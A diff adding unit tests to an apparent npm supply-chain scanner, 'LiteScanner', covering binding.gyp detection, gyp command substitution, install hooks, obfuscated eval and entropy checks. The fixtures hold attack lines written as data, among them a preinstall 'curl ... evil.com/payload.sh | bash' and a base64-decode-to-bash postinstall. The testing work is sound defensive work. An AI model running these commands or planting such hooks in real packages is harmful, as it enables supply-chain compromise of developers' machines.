@@ -381,6 +381,136 @@ describe('LiteScanner', () => {
     });
   });
 
+  describe('Miasma-specific detection (Fase A1)', () => {
+    describe('binding.gyp filename detection', () => {
+      it('detects binding.gyp by filename', () => {
+        const findings = scanner.scanPatch('binding.gyp', '');
+        expect(findings.some(f => f.type === 'BINDING_GYP')).toBe(true);
+        const gyp = findings.find(f => f.type === 'BINDING_GYP');
+        expect(gyp).toBeDefined();
+        expect(gyp!.severity).toBe('HIGH');
+      });
+
+      it('detects binding.gypi by filename', () => {
+        const findings = scanner.scanPatch('binding.gypi', '');
+        expect(findings.some(f => f.type === 'BINDING_GYP')).toBe(true);
+      });
+
+      it('detects node-gyp-build.js by filename', () => {
+        const findings = scanner.scanPatch('node-gyp-build.js', '');
+        expect(findings.some(f => f.type === 'NODE_GYP_CAPABILITY')).toBe(true);
+      });
+
+      it('detects custom .gyp files', () => {
+        const findings = scanner.scanPatch('lib/sqlite3.gyp', '');
+        expect(findings.some(f => f.type === 'NODE_GYP_CAPABILITY')).toBe(true);
+      });
+
+      it('does not flag normal JS files as gyp', () => {
+        const findings = scanner.scanPatch('index.js', '+ const x = 1;\n');
+        expect(findings.every(f => f.type !== 'BINDING_GYP' && f.type !== 'NODE_GYP_CAPABILITY')).toBe(true);
+      });
+    });
+
+    describe('GYP command substitution detection', () => {
+      it('detects <!(command) gyp command execution', () => {
+        const patch = `+  '<!(curl http://evil.com/payload)',\n`;
+        const findings = scanner.scanPatch('binding.gyp', patch);
+        expect(findings.some(f => f.type === 'GYP_COMMAND_SUBSTITUTION')).toBe(true);
+      });
+
+      it('detects <!(command) gyp execution syntax', () => {
+        const patch = "+  '<!(curl http://evil.com)'\n";
+        const findings = scanner.scanPatch('binding.gyp', patch);
+        expect(findings.some(f => f.type === 'GYP_COMMAND_SUBSTITUTION')).toBe(true);
+      });
+
+      it('detects GYP downloader pattern', () => {
+        const patch = '+  if (binding.gyp.includes("curl")) {\n';
+        const findings = scanner.scanPatch('build.js', patch);
+        expect(findings.some(f => f.type === 'GYP_DOWNLOADER')).toBe(true);
+      });
+    });
+
+    describe('lifecycle script detection', () => {
+      it('detects preinstall with curl|bash', () => {
+        const patch = '+  "preinstall": "curl -s http://evil.com/payload.sh | bash",\n';
+        const findings = scanner.scanPatch('package.json', patch);
+        expect(findings.some(f => f.type === 'LIFECYCLE_CURL_BASH')).toBe(true);
+      });
+
+      it('detects postinstall with base64 decode', () => {
+        const patch = '+  "postinstall": "echo base64_payload | base64 -d | bash",\n';
+        const findings = scanner.scanPatch('package.json', patch);
+        expect(findings.some(f => f.type === 'LIFECYCLE_OBFUSCATED')).toBe(true);
+      });
+
+      it('detects aggressive lifecycle (preinstall + postinstall)', () => {
+        const patch = '+  "scripts": { "preinstall": "node evil.js", "postinstall": "node evil2.js", "install": "node evil3.js" },\n';
+        const findings = scanner.scanPatch('package.json', patch);
+        expect(findings.some(f => f.type === 'LIFECYCLE_CURL_BASH' || f.type === 'LIFECYCLE_OBFUSCATED')).toBe(true);
+      });
+    });
+
+    describe('obfuscation detection', () => {
+      it('detects hex-encoded strings in eval', () => {
+        const patch = '+  eval("\\x72\\x65\\x71\\x75\\x69\\x72\\x65\\x28\\x27\\x66\\x73\\x27\\x29");\n';
+        const findings = scanner.scanPatch('test.js', patch);
+        expect(findings.some(f => f.type === 'OBFUSCATED_PAYLOAD')).toBe(true);
+      });
+
+      it('detects unicode-escaped strings in Function', () => {
+        const patch = '+  new Function("\\u0072\\u0065\\u0071\\u0075\\u0069\\u0072\\u0065");\n';
+        const findings = scanner.scanPatch('test.js', patch);
+        expect(findings.some(f => f.type === 'OBFUSCATED_PAYLOAD')).toBe(true);
+      });
+    });
+
+    describe('scanFileContent (full file scan)', () => {
+      it('returns findings for file content', () => {
+        const result = scanner.scanFileContent('test.js', 'eval(x);\nrequire("child_process");\n');
+        expect(result.findings.length).toBeGreaterThanOrEqual(2);
+        expect(result.findings.some(f => f.type === 'UNSAFE_EVAL')).toBe(true);
+        expect(result.findings.some(f => f.type === 'OS_CAPABILITY')).toBe(true);
+      });
+
+      it('calculates zero entropy for uniform content', () => {
+        const result = scanner.scanFileContent('test.js', 'a'.repeat(1000));
+        expect(result.entropyScore).toBe(0);
+      });
+
+      it('calculates high entropy for random content', () => {
+        const buf = Buffer.alloc(500);
+        for (let i = 0; i < 500; i++) buf[i] = Math.floor(Math.random() * 256);
+        const result = scanner.scanFileContent('test.js', buf.toString('binary'));
+        // Random bytes typically have entropy > 5.5
+        expect(result.entropyScore).toBeGreaterThan(5);
+      });
+
+      it('detects size anomaly for large files', () => {
+        const result = scanner.scanFileContent('test.js', 'x'.repeat(600000));
+        expect(result.sizeAnomaly).toBe(true);
+      });
+
+      it('does not flag normal sized files', () => {
+        const result = scanner.scanFileContent('test.js', 'console.log("hello");\n');
+        expect(result.sizeAnomaly).toBe(false);
+      });
+
+      it('flags high entropy files with HIGH_ENTROPY finding', () => {
+        const buf = Buffer.alloc(1000);
+        for (let i = 0; i < 1000; i++) buf[i] = Math.floor(Math.random() * 256);
+        const result = scanner.scanFileContent('test.js', buf.toString('binary'));
+        expect(result.findings.some(f => f.type === 'HIGH_ENTROPY')).toBe(true);
+      });
+
+      it('detects binding.gyp via scanFileContent filename check', () => {
+        const result = scanner.scanFileContent('binding.gyp', '{}');
+        expect(result.findings.some(f => f.type === 'BINDING_GYP')).toBe(true);
+      });
+    });
+  });
+
   describe('auditPR', () => {
     it('returns a verdict with scanId and findings', async () => {
       const result = await scanner.auditPR('test-repo', 42, 'test-author', [
